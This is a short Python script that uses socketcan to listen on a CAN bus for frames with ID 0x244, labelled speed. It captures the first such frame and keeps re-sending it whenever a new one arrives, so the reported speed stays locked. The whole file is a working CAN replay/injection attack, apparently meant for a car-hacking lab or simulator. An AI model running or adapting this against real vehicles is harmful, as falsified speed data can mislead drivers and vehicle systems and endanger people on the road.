#!/usr/bin/python3

import argparse
import can


SPEED_ID = 0x244


g_speed = b"\x00\x00\x00\x00\x00\x00\x00\x00"


def lock_speed(interface: str) -> None:
    global g_speed

    with can.Bus(
        channel=interface,
        bustype="socketcan",
        can_filters=[{"can_id": SPEED_ID, "can_mask": 0xFFF, "extended": False}],
    ) as bus:
        g_speed = bus.recv()

        while True:
            bus.recv()
            bus.send(g_speed)


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("interface")
    args = parser.parse_args()

    try:
        lock_speed(args.interface)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
